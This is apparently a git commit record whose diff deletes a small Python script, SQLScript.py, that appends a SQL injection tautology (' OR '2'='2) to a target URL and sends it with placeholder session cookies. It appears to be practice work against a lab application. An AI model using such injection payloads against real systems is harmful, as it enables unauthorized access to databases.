6ba41260df33a830be713ef004d316650e36b756
ahmad allobani <54261085+ahmadallobani@users.noreply.github.com>
2024-05-09 15:27:34 -0400

    1

--- SQLScript.py
+++
@@ -1,9 +0,0 @@
-import sys
-
-import requests
-
-URL = sys.argv[1]+"' OR '2'='2"  # change the sql payload 
-
-
-resp = requests.get(URL, cookies={"PHPSESSID": "","security":" " })# add ur cookies
-print(resp.text)
